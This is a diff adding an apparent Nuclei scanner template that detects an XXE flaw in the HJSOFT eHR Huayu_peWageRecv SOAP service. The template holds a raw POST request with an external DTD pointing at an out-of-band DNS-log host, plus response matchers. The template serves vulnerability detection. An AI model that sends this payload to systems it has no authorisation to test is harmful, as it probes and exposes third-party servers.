@@ -1,0 +1,50 @@
+id: hjsoft-ehr-huayu-pewagerecv-xxe
+info:
+  name: HJSOFT eHR Huayu_peWageRecv XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dns
+
+dns:
+  - name: dns-log
+    type: A
+    class: inet
+    retries: 3
+    recursion: true
+
+http:
+  - raw:
+      - |
+        POST /services/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: ""
+        Content-Type: text/xml;charset=UTF-8
+
+        <!DOCTYPE syscode SYSTEM "http://{{dns-log}}/Huayu_peWageRecv">
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrp:Huayu_peWageRecv>
+                 <hrp:in0><syscode>&send;</syscode></hrp:in0>
+              </hrp:Huayu_peWageRecv>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "java.io.IOException"
+          - "Huayu_peWageRecv"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
